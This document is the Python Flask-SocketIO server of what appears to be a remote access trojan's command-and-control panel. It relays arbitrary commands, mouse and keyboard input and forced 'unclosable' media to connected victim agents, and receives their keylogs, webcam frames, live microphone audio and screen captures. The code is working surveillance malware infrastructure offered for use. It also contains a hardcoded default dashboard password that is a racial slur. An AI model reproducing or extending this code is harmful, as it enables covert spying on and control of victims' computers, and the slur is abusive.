from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room, disconnect
from datetime import datetime
import uuid, os, base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'changeme123'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024   # 100 MB HTTP upload limit

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='threading',
    max_http_buffer_size=100 * 1024 * 1024,
)

# ── Dashboard password ────────────────────────────────────────
DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'youarenigger')
authed_sids = set()

clients    = {}
agent_sids = {}
dashboard_sids = set()

@app.route('/')
def index():
    return render_template('index.html')

# ── HTTP media upload ─────────────────────────────────────────
# Dashboard POSTs the file here over plain HTTP instead of the
# WebSocket, so large files never touch the WS message-size limit.
@app.route('/upload_media/<client_id>', methods=['POST'])
def upload_media(client_id):
    token = request.headers.get('X-Dashboard-Token', '')
    if token != DASHBOARD_PASS:
        return jsonify({'status': 'error', 'msg': 'Unauthorized'}), 403

    if client_id not in agent_sids:
        return jsonify({'status': 'error', 'msg': 'Agent not connected'}), 404

    f = request.files.get('file')
    if not f:
        return jsonify({'status': 'error', 'msg': 'No file provided'}), 400

    ext        = request.form.get('ext', 'mp3')
    unclosable = request.form.get('unclosable', 'false').lower() == 'true'
    rid        = request.form.get('rid', str(uuid.uuid4()))

    data_b64 = base64.b64encode(f.read()).decode()

    socketio.emit('cmd', {
        'client_id':  client_id,
        'action':     'play_media',
        'rid':        rid,
        'data':       data_b64,
        'ext':        ext,
        'unclosable': unclosable,
    }, to=agent_sids[client_id])

    return jsonify({'status': 'ok', 'rid': rid})

# ── Agent events ─────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    pass

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    authed_sids.discard(sid)
    for cid, csid in list(agent_sids.items()):
        if csid == sid:
            if cid in clients:
                clients[cid]['status'] = 'offline'
            del agent_sids[cid]
            broadcast_clients()
            break
    dashboard_sids.discard(sid)

@socketio.on('agent_register')
def handle_agent_register(data):
    cid = data.get('client_id', str(uuid.uuid4()))
    agent_sids[cid] = request.sid
    join_room(f'agent_{cid}')
    clients[cid] = {
        'id':           cid,
        'hostname':     data.get('hostname',     'Unknown'),
        'ip':           data.get('ip', request.remote_addr),
        'username':     data.get('username',     'Unknown'),
        'platform':     data.get('platform',     'Unknown'),
        'connected_at': data.get('connected_at', datetime.now().isoformat()),
        'last_seen':    datetime.now().isoformat(),
        'status':       'online',
        'sid':          request.sid,
    }
    broadcast_clients()

# ── Dashboard auth ────────────────────────────────────────────

@socketio.on('dashboard_auth')
def handle_dashboard_auth(data):
    if data.get('password') == DASHBOARD_PASS:
        authed_sids.add(request.sid)
        emit('auth_result', {'ok': True})
    else:
        emit('auth_result', {'ok': False, 'msg': 'Wrong password'})

@socketio.on('dashboard_join')
def handle_dashboard_join():
    if request.sid not in authed_sids:
        emit('auth_required')
        return
    dashboard_sids.add(request.sid)
    join_room('dashboards')
    emit('client_update', {'clients': sanitized_clients()})

@socketio.on('request_clients')
def handle_request_clients():
    if request.sid not in authed_sids:
        emit('auth_required')
        return
    emit('client_update', {'clients': sanitized_clients()})

# ── Dashboard -> Agent relay ──────────────────────────────────

def _check_auth():
    if request.sid not in authed_sids:
        emit('auth_required')
        return False
    return True

@socketio.on('delete_client')
def handle_delete_client(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if not cid:
        emit('cmd_response', {'status': 'error', 'msg': 'No client_id'})
        return
    # Block deletion of online clients
    if cid in agent_sids:
        emit('delete_result', {'status': 'error', 'msg': 'Cannot delete an online client. Disconnect the client first.'})
        return
    if cid in clients:
        del clients[cid]
    if cid in agent_sids:
        del agent_sids[cid]
    emit('delete_result', {'status': 'ok', 'client_id': cid})
    broadcast_clients()

@socketio.on('cmd')
def handle_cmd(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('cmd', data, to=agent_sids[cid])
    else:
        emit('cmd_response', {'client_id': cid, 'rid': data.get('rid',''), 'status': 'error', 'msg': 'Agent not connected'})

@socketio.on('start_stream')
def handle_start_stream(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('start_stream', data, to=agent_sids[cid])

@socketio.on('stop_stream')
def handle_stop_stream(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('stop_stream', data, to=agent_sids[cid])

@socketio.on('mouse_move')
def handle_mouse_move(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_move', data, to=agent_sids[cid])

@socketio.on('mouse_click')
def handle_mouse_click(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_click', data, to=agent_sids[cid])

@socketio.on('key_press')
def handle_key_press(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('key_press', data, to=agent_sids[cid])

# ── Agent -> Dashboard relay ──────────────────────────────────

@socketio.on('webcam_frame')
def handle_webcam_frame(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('webcam_frame', data, to='dashboards')

@socketio.on('mic_live_chunk')
def handle_mic_live_chunk(data):
    socketio.emit('mic_live_chunk', data, to='dashboards')

@socketio.on('mic_data')
def handle_mic_data(data):
    socketio.emit('mic_data', data, to='dashboards')

@socketio.on('auto_screenshot')
def handle_auto_screenshot(data):
    socketio.emit('auto_screenshot', data, to='dashboards')

@socketio.on('screen_frame')
def handle_screen_frame(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('screen_frame', data, to='dashboards')

@socketio.on('chat_reply')
def handle_chat_reply(data):
    socketio.emit('chat_reply', data, to='dashboards')

@socketio.on('keylog_data')
def handle_keylog_data(data):
    socketio.emit('keylog_data', data, to='dashboards')

@socketio.on('cmd_response')
def handle_cmd_response(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('cmd_response', data, to='dashboards')

# ── Helpers ───────────────────────────────────────────────────

def sanitized_clients():
    return [{k: v for k, v in c.items() if k != 'sid'} for c in clients.values()]

def broadcast_clients():
    socketio.emit('client_update', {'clients': sanitized_clients()}, to='dashboards')

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
